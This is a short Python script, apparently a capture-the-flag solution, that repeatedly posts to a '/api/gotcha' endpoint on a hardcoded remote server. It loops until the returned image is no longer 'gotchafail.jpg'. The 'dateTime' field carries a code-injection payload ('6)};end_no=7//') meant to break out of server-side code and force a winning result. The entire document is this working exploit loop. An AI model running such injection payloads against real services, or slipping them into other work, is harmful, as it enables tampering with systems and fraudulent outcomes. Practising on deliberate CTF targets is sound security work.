import requests

url = 'http://localhost'
url = 'http://35.243.76.165:11008'

while 1:
    res = requests.post(url+"/api/gotcha", json={"userName":"asdf","userNumbers":[5,5,5],"dateTime":"6)};end_no=7//"}).json()
    
    a = requests.get(url+'/api/gotcha/'+res['result']['uuid']).json()
    print(a)
    if a['imageUrl']!='gotchafail.jpg':
        print(a)
        break
